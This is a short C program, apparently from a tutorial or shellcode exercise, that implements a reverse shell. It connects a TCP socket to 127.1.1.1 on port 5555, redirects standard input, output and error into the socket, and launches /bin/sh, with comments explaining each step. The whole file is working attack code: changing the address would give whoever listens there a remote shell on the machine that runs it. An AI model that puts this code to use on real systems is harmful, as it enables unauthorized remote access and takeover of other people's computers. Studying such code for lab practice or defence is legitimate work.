#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, int *argv[])
{
    int s;
	struct sockaddr_in addr;
	
    // set "addr.sin_family" to IPV4
	addr.sin_family = AF_INET;
	// set the port number to 5555
	addr.sin_port = htons(5555);
	// when executed the code will connect to 127.1.1.1
	addr.sin_addr.s_addr = inet_addr("127.1.1.1");

    // Create the socket
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	s = socket(AF_INET, SOCK_STREAM, 0);

    // Connect to the remote machine
    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    // Redirect the STDIN, STDOUT and STDERR into the socket
    for (int i = 0; i < 3; i++)
    {
        dup2(s, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", 0, 0);

    return 0;
}